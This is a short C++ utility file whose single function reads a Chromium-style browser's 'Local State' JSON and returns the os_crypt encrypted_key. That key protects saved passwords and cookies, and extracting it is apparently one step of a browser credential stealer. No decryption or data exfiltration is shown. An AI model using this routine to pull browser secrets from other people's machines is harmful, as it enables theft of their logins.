#include <Utils.h>


#include <nlohmann/json.hpp>

namespace Utils {

	std::string GetEncryptKey(const std::string& path) {
		std::ifstream file(path + "\\Local State");
		if (!file.is_open()) return "";
		
		nlohmann::json json;
		json << file;

		if (json.contains("os_crypt") && json["os_crypt"].contains("encrypted_key")) {
			std::string encrypted_key = json["os_crypt"]["encrypted_key"];
			return encrypted_key;
		}

		return "";
	}
} 